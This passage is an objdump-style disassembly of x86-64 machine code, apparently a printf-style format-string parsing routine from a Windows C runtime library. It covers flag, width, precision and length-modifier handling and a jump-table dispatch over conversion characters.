  406b06:	90                   	nop
  406b07:	48 83 c4 68          	add    $0x68,%rsp
  406b0b:	5b                   	pop    %rbx
  406b0c:	5e                   	pop    %rsi
  406b0d:	c3                   	ret
  406b0e:	66 90                	xchg   %ax,%ax
  406b10:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
  406b17:	41 b8 07 00 00 00    	mov    $0x7,%r8d
  406b1d:	eb 89                	jmp    0x406aa8
  406b1f:	90                   	nop
  406b20:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
  406b24:	49 89 d8             	mov    %rbx,%r8
  406b27:	48 89 c2             	mov    %rax,%rdx
  406b2a:	e8 01 ed ff ff       	call   0x405830
  406b2f:	48 89 f1             	mov    %rsi,%rcx
  406b32:	e8 f9 24 00 00       	call   0x409030
  406b37:	90                   	nop
  406b38:	48 83 c4 68          	add    $0x68,%rsp
  406b3c:	5b                   	pop    %rbx
  406b3d:	5e                   	pop    %rsi
  406b3e:	c3                   	ret
  406b3f:	90                   	nop
  406b40:	41 57                	push   %r15
  406b42:	41 56                	push   %r14
  406b44:	41 55                	push   %r13
  406b46:	41 54                	push   %r12
  406b48:	55                   	push   %rbp
  406b49:	57                   	push   %rdi
  406b4a:	56                   	push   %rsi
  406b4b:	53                   	push   %rbx
  406b4c:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
  406b53:	4c 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12
  406b5a:	00 
  406b5b:	41 89 ce             	mov    %ecx,%r14d
  406b5e:	48 89 d6             	mov    %rdx,%rsi
  406b61:	44 89 c7             	mov    %r8d,%edi
  406b64:	4c 89 cb             	mov    %r9,%rbx
  406b67:	41 81 e6 00 60 00 00 	and    $0x6000,%r14d
  406b6e:	e8 fd 34 00 00       	call   0x40a070
  406b73:	48 8d 0d 43 2d 0d 00 	lea    0xd2d43(%rip),%rcx        # 0x4d98bd
  406b7a:	44 8b 38             	mov    (%rax),%r15d
  406b7d:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
  406b82:	44 89 74 24 78       	mov    %r14d,0x78(%rsp)
  406b87:	c7 44 24 7c ff ff ff 	movl   $0xffffffff,0x7c(%rsp)
  406b8e:	ff 
  406b8f:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  406b96:	ff ff ff ff 
  406b9a:	c7 84 24 84 00 00 00 	movl   $0xfffffffd,0x84(%rsp)
  406ba1:	fd ff ff ff 
  406ba5:	66 c7 84 24 88 00 00 	movw   $0x0,0x88(%rsp)
  406bac:	00 00 00 
  406baf:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
  406bb6:	00 00 00 00 
  406bba:	66 c7 84 24 90 00 00 	movw   $0x0,0x90(%rsp)
  406bc1:	00 00 00 
  406bc4:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
  406bcb:	00 00 00 00 
  406bcf:	89 bc 24 98 00 00 00 	mov    %edi,0x98(%rsp)
  406bd6:	e8 ad 34 00 00       	call   0x40a088
  406bdb:	48 85 c0             	test   %rax,%rax
  406bde:	74 10                	je     0x406bf0
  406be0:	0f be 10             	movsbl (%rax),%edx
  406be3:	b8 02 00 00 00       	mov    $0x2,%eax
  406be8:	83 ea 30             	sub    $0x30,%edx
  406beb:	83 fa 02             	cmp    $0x2,%edx
  406bee:	76 0d                	jbe    0x406bfd
  406bf0:	e8 5b 26 00 00       	call   0x409250
  406bf5:	83 e0 01             	and    $0x1,%eax
  406bf8:	f7 d8                	neg    %eax
  406bfa:	83 c0 03             	add    $0x3,%eax
  406bfd:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
  406c04:	44 89 f0             	mov    %r14d,%eax
  406c07:	80 cc 02             	or     $0x2,%ah
  406c0a:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
  406c0e:	66 90                	xchg   %ax,%ax
  406c10:	0f be 0b             	movsbl (%rbx),%ecx
  406c13:	48 8d 73 01          	lea    0x1(%rbx),%rsi
  406c17:	85 c9                	test   %ecx,%ecx
  406c19:	0f 84 b2 00 00 00    	je     0x406cd1
  406c1f:	83 f9 25             	cmp    $0x25,%ecx
  406c22:	0f 85 c8 00 00 00    	jne    0x406cf0
  406c28:	44 89 74 24 78       	mov    %r14d,0x78(%rsp)
  406c2d:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  406c34:	ff ff ff ff 
  406c38:	45 31 d2             	xor    %r10d,%r10d
  406c3b:	c7 44 24 7c ff ff ff 	movl   $0xffffffff,0x7c(%rsp)
  406c42:	ff 
  406c43:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
  406c47:	45 31 ed             	xor    %r13d,%r13d
  406c4a:	48 89 f7             	mov    %rsi,%rdi
  406c4d:	4c 8d 5c 24 7c       	lea    0x7c(%rsp),%r11
  406c52:	48 8d 2d 7b 2c 0d 00 	lea    0xd2c7b(%rip),%rbp        # 0x4d98d4
  406c59:	84 c0                	test   %al,%al
  406c5b:	74 62                	je     0x406cbf
  406c5d:	0f be c8             	movsbl %al,%ecx
  406c60:	83 e8 20             	sub    $0x20,%eax
  406c63:	48 8d 5f 01          	lea    0x1(%rdi),%rbx
  406c67:	3c 5a                	cmp    $0x5a,%al
  406c69:	0f 86 93 00 00 00    	jbe    0x406d02
  406c6f:	83 f9 39             	cmp    $0x39,%ecx
  406c72:	0f 8f 9a 07 00 00    	jg     0x407412
  406c78:	41 83 fd 03          	cmp    $0x3,%r13d
  406c7c:	0f 87 90 07 00 00    	ja     0x407412
  406c82:	83 f9 2f             	cmp    $0x2f,%ecx
  406c85:	0f 8e 87 07 00 00    	jle    0x407412
  406c8b:	45 85 ed             	test   %r13d,%r13d
  406c8e:	0f 85 4c 06 00 00    	jne    0x4072e0
  406c94:	41 bd 01 00 00 00    	mov    $0x1,%r13d
  406c9a:	4d 85 db             	test   %r11,%r11
  406c9d:	74 15                	je     0x406cb4
  406c9f:	41 8b 03             	mov    (%r11),%eax
  406ca2:	85 c0                	test   %eax,%eax
  406ca4:	0f 88 0a 07 00 00    	js     0x4073b4
  406caa:	8d 04 80             	lea    (%rax,%rax,4),%eax
  406cad:	8d 44 41 d0          	lea    -0x30(%rcx,%rax,2),%eax
  406cb1:	41 89 03             	mov    %eax,(%r11)
  406cb4:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  406cb8:	48 89 df             	mov    %rbx,%rdi
  406cbb:	84 c0                	test   %al,%al
  406cbd:	75 9e                	jne    0x406c5d
  406cbf:	48 89 fb             	mov    %rdi,%rbx
  406cc2:	0f be 0b             	movsbl (%rbx),%ecx
  406cc5:	48 8d 73 01          	lea    0x1(%rbx),%rsi
  406cc9:	85 c9                	test   %ecx,%ecx
  406ccb:	0f 85 4e ff ff ff    	jne    0x406c1f
  406cd1:	8b 84 24 94 00 00 00 	mov    0x94(%rsp),%eax
  406cd8:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
  406cdf:	5b                   	pop    %rbx
  406ce0:	5e                   	pop    %rsi
  406ce1:	5f                   	pop    %rdi
  406ce2:	5d                   	pop    %rbp
  406ce3:	41 5c                	pop    %r12
  406ce5:	41 5d                	pop    %r13
  406ce7:	41 5e                	pop    %r14
  406ce9:	41 5f                	pop    %r15
  406ceb:	c3                   	ret
  406cec:	0f 1f 40 00          	nopl   0x0(%rax)
  406cf0:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  406cf5:	48 89 f3             	mov    %rsi,%rbx
  406cf8:	e8 23 e9 ff ff       	call   0x405620
  406cfd:	e9 0e ff ff ff       	jmp    0x406c10
  406d02:	0f b6 c0             	movzbl %al,%eax
  406d05:	48 63 44 85 00       	movslq 0x0(%rbp,%rax,4),%rax
  406d0a:	48 01 e8             	add    %rbp,%rax
  406d0d:	ff e0                	jmp    *%rax
  406d0f:	90                   	nop
  406d10:	41 83 ea 02          	sub    $0x2,%r10d
  406d14:	4c 89 e0             	mov    %r12,%rax
  406d17:	41 83 fa 01          	cmp    $0x1,%r10d
  406d1b:	0f 86 d1 05 00 00    	jbe    0x4072f2
  406d21:	48 8b 30             	mov    (%rax),%rsi
  406d24:	49 83 c4 08          	add    $0x8,%r12
  406d28:	48 85 f6             	test   %rsi,%rsi
  406d2b:	0f 84 a3 00 00 00    	je     0x406dd4
  406d31:	48 89 f1             	mov    %rsi,%rcx
  406d34:	e8 3f 32 00 00       	call   0x409f78
  406d39:	89 c2                	mov    %eax,%edx
  406d3b:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  406d40:	48 89 f1             	mov    %rsi,%rcx
  406d43:	e8 28 ea ff ff       	call   0x405770
  406d48:	e9 c3 fe ff ff       	jmp    0x406c10
  406d4d:	0f 1f 00             	nopl   (%rax)
  406d50:	45 85 ed             	test   %r13d,%r13d
  406d53:	75 0b                	jne    0x406d60
  406d55:	44 39 74 24 78       	cmp    %r14d,0x78(%rsp)
  406d5a:	0f 84 9a 06 00 00    	je     0x4073fa
  406d60:	49 8b 14 24          	mov    (%r12),%rdx
  406d64:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  406d69:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  406d6e:	b9 78 00 00 00       	mov    $0x78,%ecx
  406d73:	49 89 f4             	mov    %rsi,%r12
  406d76:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
  406d7b:	e8 20 ee ff ff       	call   0x405ba0
  406d80:	e9 8b fe ff ff       	jmp    0x406c10
  406d85:	41 83 fa 04          	cmp    $0x4,%r10d
  406d89:	49 8b 04 24          	mov    (%r12),%rax
  406d8d:	0f 84 ed 05 00 00    	je     0x407380
  406d93:	41 83 fa 01          	cmp    $0x1,%r10d
  406d97:	0f 84 26 06 00 00    	je     0x4073c3
  406d9d:	41 83 fa 02          	cmp    $0x2,%r10d
  406da1:	74 0a                	je     0x406dad
  406da3:	41 83 fa 03          	cmp    $0x3,%r10d
  406da7:	0f 84 b7 06 00 00    	je     0x407464
  406dad:	8b 94 24 94 00 00 00 	mov    0x94(%rsp),%edx
  406db4:	49 83 c4 08          	add    $0x8,%r12
  406db8:	89 10                	mov    %edx,(%rax)
  406dba:	e9 51 fe ff ff       	jmp    0x406c10
  406dbf:	90                   	nop
  406dc0:	44 89 f9             	mov    %r15d,%ecx
  406dc3:	e8 c8 32 00 00       	call   0x40a090
  406dc8:	48 85 c0             	test   %rax,%rax
  406dcb:	48 89 c6             	mov    %rax,%rsi
  406dce:	0f 85 5d ff ff ff    	jne    0x406d31
  406dd4:	ba 06 00 00 00       	mov    $0x6,%edx
  406dd9:	48 8d 35 d6 2a 0d 00 	lea    0xd2ad6(%rip),%rsi        # 0x4d98b6
  406de0:	e9 56 ff ff ff       	jmp    0x406d3b
  406de5:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  406de9:	41 ba 02 00 00 00    	mov    $0x2,%r10d
  406def:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  406df5:	3c 6c                	cmp    $0x6c,%al
  406df7:	0f 85 bb fe ff ff    	jne    0x406cb8
  406dfd:	48 8d 5f 02          	lea    0x2(%rdi),%rbx
  406e01:	0f b6 47 02          	movzbl 0x2(%rdi),%eax
  406e05:	41 b2 03             	mov    $0x3,%r10b
  406e08:	e9 ab fe ff ff       	jmp    0x406cb8
  406e0d:	0f 1f 00             	nopl   (%rax)
  406e10:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  406e14:	41 ba 03 00 00 00    	mov    $0x3,%r10d
  406e1a:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  406e20:	48 89 df             	mov    %rbx,%rdi
  406e23:	e9 93 fe ff ff       	jmp    0x406cbb
  406e28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  406e2f:	00 
  406e30:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  406e34:	41 ba 01 00 00 00    	mov    $0x1,%r10d
  406e3a:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  406e40:	3c 68                	cmp    $0x68,%al
  406e42:	0f 85 70 fe ff ff    	jne    0x406cb8
  406e48:	48 8d 5f 02          	lea    0x2(%rdi),%rbx
  406e4c:	0f b6 47 02          	movzbl 0x2(%rdi),%eax
  406e50:	41 b2 04             	mov    $0x4,%r10b
  406e53:	e9 60 fe ff ff       	jmp    0x406cb8
  406e58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  406e5f:	00 
  406e60:	8b 44 24 78          	mov    0x78(%rsp),%eax
  406e64:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  406e69:	83 c8 20             	or     $0x20,%eax
  406e6c:	a8 04                	test   $0x4,%al
  406e6e:	89 44 24 78          	mov    %eax,0x78(%rsp)
  406e72:	0f 84 f9 03 00 00    	je     0x407271
  406e78:	49 8b 04 24          	mov    (%r12),%rax
  406e7c:	db 28                	fldt   (%rax)
  406e7e:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  406e83:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  406e88:	49 89 f4             	mov    %rsi,%r12
  406e8b:	db 7c 24 40          	fstpt  0x40(%rsp)
  406e8f:	e8 2c f6 ff ff       	call   0x4064c0
  406e94:	e9 77 fd ff ff       	jmp    0x406c10
  406e99:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  406ea0:	8b 44 24 78          	mov    0x78(%rsp),%eax
  406ea4:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  406ea9:	83 c8 20             	or     $0x20,%eax
  406eac:	a8 04                	test   $0x4,%al
  406eae:	89 44 24 78          	mov    %eax,0x78(%rsp)
  406eb2:	0f 84 d9 03 00 00    	je     0x407291
  406eb8:	49 8b 04 24          	mov    (%r12),%rax
  406ebc:	db 28                	fldt   (%rax)
  406ebe:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  406ec3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  406ec8:	49 89 f4             	mov    %rsi,%r12
  406ecb:	db 7c 24 40          	fstpt  0x40(%rsp)
  406ecf:	e8 fc f4 ff ff       	call   0x4063d0
  406ed4:	e9 37 fd ff ff       	jmp    0x406c10
  406ed9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  406ee0:	8b 44 24 78          	mov    0x78(%rsp),%eax
  406ee4:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  406ee9:	83 c8 20             	or     $0x20,%eax
  406eec:	a8 04                	test   $0x4,%al
  406eee:	89 44 24 78          	mov    %eax,0x78(%rsp)
  406ef2:	0f 84 e9 02 00 00    	je     0x4071e1
  406ef8:	49 8b 04 24          	mov    (%r12),%rax
  406efc:	db 28                	fldt   (%rax)
  406efe:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  406f03:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  406f08:	49 89 f4             	mov    %rsi,%r12
  406f0b:	db 7c 24 40          	fstpt  0x40(%rsp)
  406f0f:	e8 7c fb ff ff       	call   0x406a90
  406f14:	e9 f7 fc ff ff       	jmp    0x406c10
  406f19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  406f20:	41 83 ea 02          	sub    $0x2,%r10d
  406f24:	4c 89 e0             	mov    %r12,%rax
  406f27:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  406f2e:	ff ff ff ff 
  406f32:	41 83 fa 01          	cmp    $0x1,%r10d
  406f36:	0f 86 bf 02 00 00    	jbe    0x4071fb
  406f3c:	8b 00                	mov    (%rax),%eax
  406f3e:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  406f43:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
  406f48:	ba 01 00 00 00       	mov    $0x1,%edx
  406f4d:	49 83 c4 08          	add    $0x8,%r12
  406f51:	88 44 24 60          	mov    %al,0x60(%rsp)
  406f55:	e8 16 e8 ff ff       	call   0x405770
  406f5a:	e9 b1 fc ff ff       	jmp    0x406c10
  406f5f:	90                   	nop
  406f60:	81 4c 24 78 80 00 00 	orl    $0x80,0x78(%rsp)
  406f67:	00 
  406f68:	41 83 fa 03          	cmp    $0x3,%r10d
  406f6c:	0f 84 ea 03 00 00    	je     0x40735c
  406f72:	41 83 fa 02          	cmp    $0x2,%r10d
  406f76:	0f 84 5a 04 00 00    	je     0x4073d6
  406f7c:	49 63 04 24          	movslq (%r12),%rax
  406f80:	41 83 fa 01          	cmp    $0x1,%r10d
  406f84:	49 8d 54 24 08       	lea    0x8(%r12),%rdx
  406f89:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  406f8e:	0f 84 95 04 00 00    	je     0x407429
  406f94:	41 83 fa 04          	cmp    $0x4,%r10d
  406f98:	49 89 d4             	mov    %rdx,%r12
  406f9b:	0f 84 d7 04 00 00    	je     0x407478
  406fa1:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
  406fa6:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  406fab:	e8 20 e9 ff ff       	call   0x4058d0
  406fb0:	e9 5b fc ff ff       	jmp    0x406c10
  406fb5:	41 83 fa 03          	cmp    $0x3,%r10d
  406fb9:	0f 84 af 03 00 00    	je     0x40736e
  406fbf:	41 83 fa 02          	cmp    $0x2,%r10d
  406fc3:	0f 84 1f 04 00 00    	je     0x4073e8
  406fc9:	49 8d 44 24 08       	lea    0x8(%r12),%rax
  406fce:	45 8b 24 24          	mov    (%r12),%r12d
  406fd2:	41 83 fa 01          	cmp    $0x1,%r10d
  406fd6:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
  406fdb:	0f 84 5b 04 00 00    	je     0x40743c
  406fe1:	41 83 fa 04          	cmp    $0x4,%r10d
  406fe5:	49 89 c4             	mov    %rax,%r12
  406fe8:	0f 84 9a 04 00 00    	je     0x407488
  406fee:	83 f9 75             	cmp    $0x75,%ecx
  406ff1:	74 ae                	je     0x406fa1
  406ff3:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
  406ff8:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  406ffd:	e8 9e eb ff ff       	call   0x405ba0
  407002:	e9 09 fc ff ff       	jmp    0x406c10
  407007:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40700e:	00 00 
  407010:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407014:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407019:	83 c8 20             	or     $0x20,%eax
  40701c:	a8 04                	test   $0x4,%al
  40701e:	89 44 24 78          	mov    %eax,0x78(%rsp)
  407022:	0f 84 0e 02 00 00    	je     0x407236
  407028:	49 8b 04 24          	mov    (%r12),%rax
  40702c:	db 28                	fldt   (%rax)
  40702e:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  407033:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  407038:	49 89 f4             	mov    %rsi,%r12
  40703b:	db 7c 24 40          	fstpt  0x40(%rsp)
  40703f:	e8 1c f6 ff ff       	call   0x406660
  407044:	e9 c7 fb ff ff       	jmp    0x406c10
  407049:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407050:	83 4c 24 78 04       	orl    $0x4,0x78(%rsp)
  407055:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  40705b:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  40705f:	48 89 df             	mov    %rbx,%rdi
  407062:	e9 54 fc ff ff       	jmp    0x406cbb
  407067:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40706e:	00 00 
  407070:	41 83 fd 01          	cmp    $0x1,%r13d
  407074:	0f 86 18 03 00 00    	jbe    0x407392
  40707a:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  40707e:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  407084:	48 89 df             	mov    %rbx,%rdi
  407087:	e9 2f fc ff ff       	jmp    0x406cbb
  40708c:	0f 1f 40 00          	nopl   0x0(%rax)
  407090:	45 85 ed             	test   %r13d,%r13d
  407093:	0f 85 1b fc ff ff    	jne    0x406cb4
  407099:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
  4070a0:	00 
  4070a1:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4070a5:	48 89 df             	mov    %rbx,%rdi
  4070a8:	e9 0e fc ff ff       	jmp    0x406cbb
  4070ad:	0f 1f 00             	nopl   (%rax)
  4070b0:	45 85 ed             	test   %r13d,%r13d
  4070b3:	0f 85 fb fb ff ff    	jne    0x406cb4
  4070b9:	81 4c 24 78 00 01 00 	orl    $0x100,0x78(%rsp)
  4070c0:	00 
  4070c1:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4070c5:	48 89 df             	mov    %rbx,%rdi
  4070c8:	e9 ee fb ff ff       	jmp    0x406cbb
  4070cd:	0f 1f 00             	nopl   (%rax)
  4070d0:	4d 85 db             	test   %r11,%r11
  4070d3:	74 a5                	je     0x40707a
  4070d5:	41 f7 c5 fd ff ff ff 	test   $0xfffffffd,%r13d
  4070dc:	0f 85 4e 02 00 00    	jne    0x407330
  4070e2:	41 8b 04 24          	mov    (%r12),%eax
  4070e6:	49 8d 54 24 08       	lea    0x8(%r12),%rdx
  4070eb:	85 c0                	test   %eax,%eax
  4070ed:	41 89 03             	mov    %eax,(%r11)
  4070f0:	0f 88 58 03 00 00    	js     0x40744e
  4070f6:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4070fa:	49 89 d4             	mov    %rdx,%r12
  4070fd:	45 31 db             	xor    %r11d,%r11d
  407100:	48 89 df             	mov    %rbx,%rdi
  407103:	e9 b3 fb ff ff       	jmp    0x406cbb
  407108:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40710f:	00 
  407110:	45 85 ed             	test   %r13d,%r13d
  407113:	0f 85 9b fb ff ff    	jne    0x406cb4
  407119:	44 89 54 24 28       	mov    %r10d,0x28(%rsp)
  40711e:	4c 89 5c 24 30       	mov    %r11,0x30(%rsp)
  407123:	81 4c 24 78 00 10 00 	orl    $0x1000,0x78(%rsp)
  40712a:	00 
  40712b:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
  407132:	00 
  407133:	e8 48 2f 00 00       	call   0x40a080
  407138:	48 8b 50 08          	mov    0x8(%rax),%rdx
  40713c:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
  407141:	48 8d 4c 24 5a       	lea    0x5a(%rsp),%rcx
  407146:	41 b8 10 00 00 00    	mov    $0x10,%r8d
  40714c:	e8 6f 1c 00 00       	call   0x408dc0
  407151:	85 c0                	test   %eax,%eax
  407153:	44 8b 54 24 28       	mov    0x28(%rsp),%r10d
  407158:	4c 8b 5c 24 30       	mov    0x30(%rsp),%r11
  40715d:	7e 0d                	jle    0x40716c
  40715f:	0f b7 54 24 5a       	movzwl 0x5a(%rsp),%edx
  407164:	66 89 94 24 90 00 00 	mov    %dx,0x90(%rsp)
  40716b:	00 
  40716c:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%rsp)
  407173:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407177:	e9 3c fb ff ff       	jmp    0x406cb8
  40717c:	0f 1f 40 00          	nopl   0x0(%rax)
  407180:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  407185:	e8 96 e4 ff ff       	call   0x405620
  40718a:	e9 81 fa ff ff       	jmp    0x406c10
  40718f:	90                   	nop
  407190:	45 85 ed             	test   %r13d,%r13d
  407193:	0f 85 1b fb ff ff    	jne    0x406cb4
  407199:	81 4c 24 78 00 08 00 	orl    $0x800,0x78(%rsp)
  4071a0:	00 
  4071a1:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4071a5:	48 89 df             	mov    %rbx,%rdi
  4071a8:	e9 0e fb ff ff       	jmp    0x406cbb
  4071ad:	0f 1f 00             	nopl   (%rax)
  4071b0:	45 85 ed             	test   %r13d,%r13d
  4071b3:	0f 85 fb fa ff ff    	jne    0x406cb4
  4071b9:	83 4c 24 78 40       	orl    $0x40,0x78(%rsp)
  4071be:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4071c2:	48 89 df             	mov    %rbx,%rdi
  4071c5:	e9 f1 fa ff ff       	jmp    0x406cbb
  4071ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4071d0:	8b 44 24 78          	mov    0x78(%rsp),%eax
  4071d4:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  4071d9:	a8 04                	test   $0x4,%al
  4071db:	0f 85 17 fd ff ff    	jne    0x406ef8
  4071e1:	41 dd 04 24          	fldl   (%r12)
  4071e5:	e9 14 fd ff ff       	jmp    0x406efe
  4071ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4071f0:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  4071f7:	ff ff ff ff 
  4071fb:	41 8b 04 24          	mov    (%r12),%eax
  4071ff:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407204:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  407209:	48 8d 4c 24 5a       	lea    0x5a(%rsp),%rcx
  40720e:	ba 01 00 00 00       	mov    $0x1,%edx
  407213:	49 89 f4             	mov    %rsi,%r12
  407216:	66 89 44 24 5a       	mov    %ax,0x5a(%rsp)
  40721b:	e8 60 e4 ff ff       	call   0x405680
  407220:	e9 eb f9 ff ff       	jmp    0x406c10
  407225:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407229:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  40722e:	a8 04                	test   $0x4,%al
  407230:	0f 85 f2 fd ff ff    	jne    0x407028
  407236:	41 dd 04 24          	fldl   (%r12)
  40723a:	e9 ef fd ff ff       	jmp    0x40702e
  40723f:	90                   	nop
  407240:	45 85 ed             	test   %r13d,%r13d
  407243:	0f 85 26 fa ff ff    	jne    0x406c6f
  407249:	81 4c 24 78 00 02 00 	orl    $0x200,0x78(%rsp)
  407250:	00 
  407251:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407255:	48 89 df             	mov    %rbx,%rdi
  407258:	e9 5e fa ff ff       	jmp    0x406cbb
  40725d:	0f 1f 00             	nopl   (%rax)
  407260:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407264:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407269:	a8 04                	test   $0x4,%al
  40726b:	0f 85 07 fc ff ff    	jne    0x406e78
  407271:	41 dd 04 24          	fldl   (%r12)
  407275:	e9 04 fc ff ff       	jmp    0x406e7e
  40727a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407280:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407284:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407289:	a8 04                	test   $0x4,%al
  40728b:	0f 85 27 fc ff ff    	jne    0x406eb8
  407291:	41 dd 04 24          	fldl   (%r12)
  407295:	e9 24 fc ff ff       	jmp    0x406ebe
  40729a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4072a0:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4072a4:	41 ba 03 00 00 00    	mov    $0x3,%r10d
  4072aa:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  4072b0:	3c 36                	cmp    $0x36,%al
  4072b2:	0f 84 8d 00 00 00    	je     0x407345
  4072b8:	3c 33                	cmp    $0x33,%al
  4072ba:	0f 85 f8 f9 ff ff    	jne    0x406cb8
  4072c0:	80 7f 02 32          	cmpb   $0x32,0x2(%rdi)
  4072c4:	0f 85 ee f9 ff ff    	jne    0x406cb8
  4072ca:	48 8d 5f 03          	lea    0x3(%rdi),%rbx
  4072ce:	0f b6 47 03          	movzbl 0x3(%rdi),%eax
  4072d2:	41 b2 02             	mov    $0x2,%r10b
  4072d5:	e9 de f9 ff ff       	jmp    0x406cb8
  4072da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4072e0:	41 83 fd 02          	cmp    $0x2,%r13d
  4072e4:	b8 03 00 00 00       	mov    $0x3,%eax
  4072e9:	44 0f 44 e8          	cmove  %eax,%r13d
  4072ed:	e9 a8 f9 ff ff       	jmp    0x406c9a
  4072f2:	49 8b 34 24          	mov    (%r12),%rsi
  4072f6:	48 8d 05 ab 25 0d 00 	lea    0xd25ab(%rip),%rax        # 0x4d98a8
  4072fd:	49 8d 7c 24 08       	lea    0x8(%r12),%rdi
  407302:	49 89 fc             	mov    %rdi,%r12
  407305:	48 85 f6             	test   %rsi,%rsi
  407308:	48 0f 44 f0          	cmove  %rax,%rsi
  40730c:	48 89 f1             	mov    %rsi,%rcx
  40730f:	e8 84 2d 00 00       	call   0x40a098
  407314:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  407319:	89 c2                	mov    %eax,%edx
  40731b:	48 89 f1             	mov    %rsi,%rcx
  40731e:	e8 5d e3 ff ff       	call   0x405680
  407323:	e9 e8 f8 ff ff       	jmp    0x406c10
  407328:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40732f:	00 
  407330:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407334:	45 31 db             	xor    %r11d,%r11d
  407337:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  40733d:	48 89 df             	mov    %rbx,%rdi
  407340:	e9 76 f9 ff ff       	jmp    0x406cbb
  407345:	80 7f 02 34          	cmpb   $0x34,0x2(%rdi)
  407349:	0f 85 69 f9 ff ff    	jne    0x406cb8
  40734f:	48 8d 5f 03          	lea    0x3(%rdi),%rbx
  407353:	0f b6 47 03          	movzbl 0x3(%rdi),%eax
  407357:	e9 5c f9 ff ff       	jmp    0x406cb8
  40735c:	49 8b 04 24          	mov    (%r12),%rax
